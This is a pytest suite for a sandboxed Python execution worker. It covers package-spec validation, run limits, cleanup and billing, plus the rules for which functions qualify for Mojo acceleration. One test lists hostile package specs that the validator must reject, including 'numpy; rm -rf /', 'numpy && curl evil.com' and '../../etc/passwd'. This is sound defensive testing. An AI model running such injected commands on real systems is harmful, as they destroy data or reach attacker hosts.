"""Tests for the execution worker.

Run: python -m pytest runner/tests -q
"""

from __future__ import annotations

import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import accel  # noqa: E402
import envs  # noqa: E402
import sandbox  # noqa: E402


@pytest.fixture(scope="session")
def python_exe():
    exe, _ = envs.ensure([])
    return exe


def run(python_exe, code, **kw):
    return sandbox.run(python=python_exe, code=code, **kw)


# --- package specs reach an argv, so they are validated hard ---

@pytest.mark.parametrize("spec", [
    "numpy", "pandas==2.2.*", "scikit-learn>=1.4", "uvicorn[standard]",
])
def test_valid_package_specs(spec):
    assert spec in envs.normalize([spec])


@pytest.mark.parametrize("spec", [
    "--index-url=http://evil", "numpy; rm -rf /", "../../etc/passwd",
    "git+https://github.com/x/y", "numpy && curl evil.com", "",
])
def test_rejected_package_specs(spec):
    if spec == "":
        assert envs.normalize([spec]) == sorted(envs.BASE_PACKAGES)
        return
    with pytest.raises(envs.EnvError):
        envs.normalize([spec])


def test_env_key_is_stable_and_order_independent():
    a = envs.key_for(envs.normalize(["numpy", "pytz"]))
    b = envs.key_for(envs.normalize(["pytz", "numpy"]))
    assert a == b


def test_too_many_packages_rejected():
    with pytest.raises(envs.EnvError):
        envs.normalize([f"pkg{i}" for i in range(envs.MAX_PACKAGES + 5)])


# --- execution ---

def test_stdout_and_exit_code(python_exe):
    r = run(python_exe, "print('hello')", timeout_ms=10000)
    assert r["ok"] and r["stdout"] == "hello\n" and r["exit_code"] == 0


def test_stdin_and_args(python_exe):
    code = "import sys\nprint(sys.stdin.read().strip(), sys.argv[1])"
    r = run(python_exe, code, stdin="from-stdin", args=["from-argv"], timeout_ms=10000)
    assert r["stdout"].strip() == "from-stdin from-argv"


def test_traceback_quotes_the_users_source(python_exe):
    r = run(python_exe, "x = 1\nraise ValueError('boom')", timeout_ms=10000)
    assert not r["ok"]
    assert "ValueError: boom" in r["stderr"]
    # linecache registration is what puts the offending line in the traceback.
    assert "raise ValueError('boom')" in r["stderr"]


def test_syntax_error_is_reported_not_crashed(python_exe):
    r = run(python_exe, "def (:", timeout_ms=10000)
    assert not r["ok"] and "SyntaxError" in r["stderr"]


def test_timeout_is_enforced_and_reported(python_exe):
    r = run(python_exe, "while True:\n    pass", timeout_ms=1200)
    assert r["timed_out"]
    # The deadline is the user's, not the deadline plus our warm budget.
    assert r["wall_ms"] < 6000


def test_exit_code_propagates(python_exe):
    r = run(python_exe, "import sys; sys.exit(3)", timeout_ms=10000)
    assert r["exit_code"] == 3 and not r["ok"]


def test_output_is_capped(python_exe):
    r = run(python_exe, "print('x' * 2_000_000)", timeout_ms=20000)
    assert len(r["stdout"]) <= sandbox.MAX_OUTPUT + 200
    assert "truncated" in r["stdout"]


def test_run_directory_is_cleaned_up(python_exe):
    r = run(python_exe, "print(1)", timeout_ms=10000)
    assert not os.path.exists(os.path.join(sandbox.RUN_ROOT, r["run_id"]))


def test_billing_clock_excludes_the_warm_phase(python_exe):
    # A trivial program must not be billed for anything we do afterwards.
    r = run(python_exe, "print(1)", timeout_ms=10000)
    assert r["user_ms"] < r["wall_ms"] + 1
    assert r["user_ms"] < 500


# --- acceleration policy ---

def test_eligible_function_is_decorated():
    import ast

    tree = ast.parse(
        "def kernel(n: int) -> float:\n"
        "    t = 0.0\n"
        "    for i in range(n):\n"
        "        t += i\n"
        "    return t\n"
    )
    if not accel.enabled():
        pytest.skip("no Mojo toolchain on this machine")
    assert accel.accelerate(tree) == ["kernel"]


def test_ineligible_functions_are_left_alone():
    import ast

    tree = ast.parse(
        "import json\n"
        "def loads(path):\n"
        "    with open(path) as fh:\n"
        "        return json.load(fh)\n"
        "def noloop(a, b):\n"
        "    return a + b\n"
    )
    assert accel.accelerate(tree) == []


def test_accel_can_be_switched_off(python_exe):
    code = ("def k(n: int) -> float:\n"
            "    t = 0.0\n"
            "    for i in range(n):\n"
            "        t += i * 0.5\n"
            "    return t\n"
            "print(k(1000))\n")
    r = run(python_exe, code, timeout_ms=20000, accel=False)
    assert r["ok"] and r["accelerated"] == []


# --- what the static filter has to catch for free ---------------------------
#
# Everything the filter lets through and the transpiler then rejects is work
# done for nothing, and in the service it is the *host* that pays: a compile is
# queued, five seconds of compiler produce a unit, and nothing ever loads it.
# bench/fallback_study.py measures the gap against a labelled corpus; these pin
# the individual reasons so a regression names itself.

def _verdict(source: str, entry: str) -> bool:
    import ast

    tree = ast.parse(source)
    names = {n.name: n for n in tree.body if isinstance(n, ast.FunctionDef)}
    fn = next(n for n in tree.body
              if isinstance(n, ast.FunctionDef) and n.name == entry)
    # Exactly what `accelerate` asks, module constants included.
    return accel.eligible(fn, names, consts=accel.module_constants(tree))


def test_a_module_constant_is_now_folded_in():
    # Hoisting a window size to the top of the file is good Python, and used to
    # be the most common reason a numeric function would not compile. The
    # literal goes into the emitted Mojo, so the unit's content hash moves with
    # the constant.
    assert _verdict(
        "WINDOW = 64\n"
        "def score(xs) -> float:\n"
        "    total = 0.0\n"
        "    for i in range(WINDOW):\n"
        "        total += xs[i]\n"
        "    return total\n", "score")


def test_a_module_global_that_is_not_a_literal_is_still_refused():
    # Only literals are folded. Anything else would have to be *run* to know
    # its value, and a value we cannot see is `Unsupported: unbound name`.
    assert not _verdict(
        "import numpy as np\n"
        "TABLE = np.arange(64)\n"
        "def score(xs) -> float:\n"
        "    total = 0.0\n"
        "    for i in range(10):\n"
        "        total += xs[i] * TABLE[i]\n"
        "    return total\n", "score")
    # ... and a name the module rebinds is a variable, not a constant.
    assert not _verdict(
        "WINDOW = 64\n"
        "WINDOW = 128\n"
        "def score(xs) -> float:\n"
        "    total = 0.0\n"
        "    for i in range(WINDOW):\n"
        "        total += xs[i]\n"
        "    return total\n", "score")


def test_attribute_access_is_refused():
    assert not _verdict(
        "def total(rows) -> float:\n"
        "    out = 0.0\n"
        "    for i in range(len(rows)):\n"
        "        out += rows[i].value\n"
        "    return out\n", "total")
    # ... including on a method that is not a call we can emit
    assert not _verdict(
        "def total(xs) -> float:\n"
        "    out = 0.0\n"
        "    for i in range(len(xs)):\n"
        "        out += xs.item(i)\n"
        "    return out\n", "total")


def test_an_uncompilable_helper_takes_its_caller_with_it():
    # The transpiler emits the whole unit or none of it, so a caller whose own
    # body is clean is still not compilable.
    source = (
        "def helper(x):\n"
        "    return sorted([x, 1.0])[0]\n"
        "def process(xs) -> float:\n"
        "    total = 0.0\n"
        "    for i in range(len(xs)):\n"
        "        total += helper(xs[i])\n"
        "    return total\n"
    )
    assert not _verdict(source, "process")


def test_an_unannotated_helper_is_not_in_the_unit():
    # mojosub builds helper signatures from annotations only. Without them the
    # helper is absent and the call to it cannot be emitted, however numeric it
    # looks.
    assert not _verdict(
        "def double(x):\n"
        "    return x * 2.0\n"
        "def total(xs) -> float:\n"
        "    out = 0.0\n"
        "    for i in range(len(xs)):\n"
        "        out += double(xs[i])\n"
        "    return out\n", "total")


def test_an_annotated_helper_keeps_its_caller_eligible():
    assert _verdict(
        "def double(x: float) -> float:\n"
        "    return x * 2.0\n"
        "def total(xs) -> float:\n"
        "    out = 0.0\n"
        "    for i in range(len(xs)):\n"
        "        out += double(xs[i])\n"
        "    return out\n", "total")


def test_a_helper_needs_no_loop_of_its_own():
    # `compilable` and `eligible` are different questions: the loop requirement
    # is about whether there is anything to win, and a helper called from inside
    # somebody else's loop wins plenty.
    import ast

    node = ast.parse("def sq(x: float) -> float:\n    return x * x\n").body[0]
    assert accel.compilable(node, {})
    assert not accel.eligible(node, {})


def test_string_and_container_literals_are_refused():
    for body in ('    tag = "x"\n        total += len(tag)\n',
                 '    seen = {}\n        total += len(seen)\n',
                 '    seen = [1.0]\n        total += seen[0]\n'):
        source = ("def f(n: int) -> float:\n"
                  "    total = 0.0\n"
                  "    for i in range(n):\n"
                  f"    {body}"
                  "    return total\n")
        assert not _verdict(source, "f"), source


def test_keyword_arguments_are_refused():
    assert not _verdict(
        "def helper(x: float, k: float) -> float:\n"
        "    return x * k\n"
        "def f(xs) -> float:\n"
        "    out = 0.0\n"
        "    for i in range(len(xs)):\n"
        "        out += helper(xs[i], k=2.0)\n"
        "    return out\n", "f")


def test_a_function_with_no_arguments_is_still_worth_compiling():
    # It cannot be specialised on argument types, but a warm start dispatches it
    # natively on the first call from the shared cache — measured 170x on the
    # corpus. Refusing it gave that up for nothing.
    assert _verdict(
        "def constant_work() -> int:\n"
        "    total = 0\n"
        "    for i in range(1000):\n"
        "        total += i * i\n"
        "    return total\n", "constant_work")


def test_annotations_are_not_read_as_free_variables():
    # `list[float]` must not make `list` look like a name the body reads.
    assert _verdict(
        "def total(xs: list[float], n: int) -> float:\n"
        "    out = 0.0\n"
        "    for i in range(n):\n"
        "        out += xs[i]\n"
        "    return out\n", "total")


def test_recursion_does_not_loop_the_checker():
    assert _verdict(
        "def down(n: int) -> int:\n"
        "    total = 0\n"
        "    for i in range(n):\n"
        "        total += down(n - 1)\n"
        "    return total\n", "down")


def test_the_real_kernels_still_pass():
    # The whole point is not to lose these. Each is measured at 38x-359x in
    # bench/fallback_study.py.
    from bench.corpus import CASES

    import ast

    for case in CASES:
        if case.label != "native":
            continue
        tree = ast.parse(case.source)
        names = {n.name: n for n in tree.body if isinstance(n, ast.FunctionDef)}
        # Same question `accelerate` asks, constants included.
        consts = accel.module_constants(tree)
        fn = next(n for n in tree.body
                  if isinstance(n, ast.FunctionDef) and n.name == case.entry)
        assert accel.eligible(fn, names, consts=consts), case.name


# --- module calls in the numeric subset ---
#
# `math.sqrt(x)` is how numeric Python is written and mojosub emits it, but an
# Attribute is not an allowed node and `math` is not a name the body binds, so
# the filter rejected every such function before reaching the branch written to
# accept it. Measured here, the same loop is 67x faster native.

def _fns(src):
    import ast

    tree = ast.parse(src)
    return {n.name: n for n in tree.body if isinstance(n, __import__("ast").FunctionDef)}


def _eligible(src, name="g"):
    fns = _fns(src)
    return accel.eligible(fns[name], fns)


MATH_KERNEL = ("import math\n"
               "def g(n: int) -> float:\n"
               "    t = 0.0\n"
               "    for i in range(n):\n"
               "        t += math.sqrt(i) * 0.5\n"
               "    return t\n")


def test_a_math_call_is_eligible():
    assert _eligible(MATH_KERNEL)


def test_a_numpy_scalar_call_is_eligible():
    assert _eligible("import numpy as np\n"
                     "def g(n: int) -> float:\n"
                     "    t = 0.0\n"
                     "    for i in range(n):\n"
                     "        t += np.exp(i * 0.0001)\n"
                     "    return t\n")


@pytest.mark.parametrize("src, why", [
    ("import math\n"
     "def g(n: int) -> float:\n"
     "    t = math.inf\n"
     "    for i in range(n):\n"
     "        t += i\n"
     "    return t\n", "an attribute that is not a call and not a folded "
                      "constant has no emitted form"),
    ("import math\n"
     "def g(n: int) -> float:\n"
     "    t = 0.0\n"
     "    for i in range(n):\n"
     "        t += math.gamma(i * 0.001)\n"
     "    return t\n", "allowing the module must not allow everything on it"),
    ("import math\n"
     "def g(n: int) -> float:\n"
     "    m = math\n"
     "    t = 0.0\n"
     "    for i in range(n):\n"
     "        t += m.sqrt(i)\n"
     "    return t\n", "the module itself is not a value the transpiler has"),
    ("import numpy as np\n"
     "def g(n: int) -> float:\n"
     "    t = 0.0\n"
     "    for i in range(n):\n"
     "        t += np.random.rand()\n"
     "    return t\n", "a nested attribute is not a module call"),
    ("def g(xs, n: int) -> float:\n"
     "    t = 0.0\n"
     "    for i in range(n):\n"
     "        t += xs.sum()\n"
     "    return t\n", "a method on an argument is not a module call"),
])
def test_what_a_module_root_still_does_not_buy(src, why):
    assert not _eligible(src), why
